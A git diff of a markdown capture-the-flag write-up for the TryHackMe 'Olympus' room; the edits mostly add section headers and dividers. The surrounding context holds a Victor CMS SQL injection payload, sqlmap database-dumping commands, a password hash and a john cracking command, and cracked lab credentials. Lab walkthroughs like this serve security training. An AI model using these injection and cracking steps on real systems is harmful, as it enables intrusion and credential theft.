@@ -110,6 +110,7 @@ curl http://olympus.thm/index.php
 ```
 We can see the .php extension works, so we can add '-x php' to our gobuster command to find some .php files :
 
+---
 ### GOBUSTER
 
 ```bash
@@ -155,6 +156,9 @@ We have find some path, so go check if you find some information on  http://olym
 ![http://olympus.thm/~webmaster/](https://github.com/RawMain121/writeups/blob/sandboxInit/tryHackMe/room/Olympus/data/HTTP_Victor_CMS.png?raw=true)
 
 Great, we have find some interesting stuff, like search and login fonction.
+
+---
+### SEARCHSPLOIT
 
 Let's first check if there are any **Victor CMS** vulnerabilities in **exploit-db** with **searchsploit** command line tools:
 
@@ -225,11 +229,20 @@ search=1337'union+select+1,2,version(),databases(),5,6,7,8,9,10%20--%20-&submit=
 sqlmap -u "http://example.com/CMSsite/search.php" --data="search=1337*&submit=" --dbs --random-agent -v 3
 ```
 
+
+---
+### BURP
+
 Let's open **Burp** to try the **'search' SQL Injection** exploit:
 ![Burp_SQLI_search](https://github.com/RawMain121/writeups/blob/sandboxInit/tryHackMe/room/Olympus/data/BURP_search_SQLI.png?raw=true)
 
 
-It works! Now we can run sqlmap to find the Injections :
+It works!
+
+
+---
+### SQLMAP
+Now we can run sqlmap :
 
 ```bash
 sqlmap -u "http://olympus.thm/~webmaster/search.php" --data="search=1337*&submit=" --dbs --random-agent -v 3 --batch
@@ -336,9 +349,8 @@ Table: flag
 ...
 ```
 
-Great! We have found the first flag !
+**Great! We have found the first flag !**
 
----
 Let's stay focused and keep looking for other information in the database, like the '**users**' table :
 
 ```bash
@@ -356,6 +368,8 @@ Table: users
 +---------+----------+------------+-----------+------------------------+------------+---------------+--------------------------------------------------------------+----------------+
 ```
 
+
+---
 We have just found some interesting information: 
 - **Users** :
 	- prometheus
@@ -399,6 +413,9 @@ root
 zeus
 ```
 
+
+---
+### HASHID
 Try to identify the hash format  with **hashid**:
 ```bash
 hashid users_hash.txt
@@ -419,6 +436,8 @@ Analyzing '$2y$10$cpJKDXh2wlAI5KlCsUaLCOnf0g5fiG0QSUS53zp/r0HMtaj6rT4lC'
 ```
 
 
+---
+### JOHN
 Crack **users_hash.txt** file:
 ```bash
 john --wordlist=/usr/share/wordlists/rockyou.txt users_hash.txt
@@ -431,7 +450,7 @@ summertime       (?)
 ...
 ```
 
-
+---
 John have cracked a hash, we can try to login to the chat.olympus.thm page with this creds:
 > user: prometheus
 > password: summertime
@@ -446,6 +465,9 @@ John have cracked a hash, we can try to login to the chat.olympus.thm page with 
 
 ![Login chat.olympus_Page](https://github.com/RawMain121/writeups/blob/sandboxInit/tryHackMe/room/Olympus/data/HTTP_Login_chat.png?raw=true)
 
-![Succes chat.olympus_Login !](https://github.com/RawMain121/writeups/blob/sandboxInit/tryHackMe/room/Olympus/data/HTTP_chat.olympus.thm.png?raw=true)
+![Succes chat.olympus_Login !](https://github.com/RawMain121/writeups/blob/sandboxInit/tryHackMe/room/Olympus/data/HTTP_Olympus_chatApp.png?raw=true)
 
 
+---
+---
+### GOBUSTER
